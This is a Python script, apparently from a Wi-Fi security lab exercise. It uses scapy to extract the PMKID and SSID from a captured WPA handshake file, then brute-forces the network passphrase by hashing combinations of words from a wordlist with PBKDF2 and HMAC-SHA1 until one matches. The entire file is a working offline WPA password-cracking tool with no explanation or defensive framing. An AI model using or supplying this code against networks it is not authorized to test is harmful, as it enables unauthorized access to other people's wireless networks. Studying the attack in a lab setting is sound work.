#!/usr/bin/env python
# -*- coding: utf-8 -*-

from scapy.all import *
from binascii import a2b_hex, b2a_hex
# from pbkdf2_math import pbkdf2_hex
from pbkdf2 import *
import hmac, hashlib
import itertools

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap('PMKID_handshake.pcap') 

# Transform mac from string to binary string
def normalizeMac(mac):
    return mac2str(mac)

# Return an array of SSIDs found in packets. 
def findSSID(packets, apmac):
    for packet in packets: 
        # The SSID is advertized in Beacons
        if Dot11Beacon in packet and Dot11Elt in packet[Dot11Beacon] and packet.addr2 == apmac:
            packet = packet[Dot11Beacon]
            packet = packet[Dot11Elt]
            if packet.ID == 0: # SSID
                return packet.info.decode()

def findPMKIDs(packets):
    PMKIDs = {}

    for packet in packets:
        if packet.haslayer(EAPOL):
            ssid = findSSID(packets, packet.addr2)
            if ssid != None:
                PMKIDs[ssid] = (packet[Raw].load[-16:], normalizeMac(packet.addr1), normalizeMac(packet.addr2))

    return PMKIDs

def wordCombinations(words, n):
    return list(itertools.combinations(words, n))

def PMKID(key, ssid, staMAC, apMAC):
    key = pbkdf2(hashlib.sha1, key, ssid, 4096, 32)
    return hmac.new(key,str.encode('PMK Name')+apMAC+staMAC,hashlib.sha1).digest()[:16]

# Read dictionnary words
words = [line.rstrip() for line in open('wordlist.txt', 'r')]

# Max combinations of words
maxc = int(input("Enter maximum words combinations [Int]: "))

APs = findPMKIDs(wpa)

for ssid in APs:
    for i in range(1, maxc+1):
        for key in wordCombinations(words, i):
            pmkid, stamac, apmac = APs[ssid]

            if pmkid == PMKID(str.encode(''.join(key)), str.encode(ssid), stamac, apmac):
                print("Found passphrase ", key, " for AP ", ssid)
                break
            
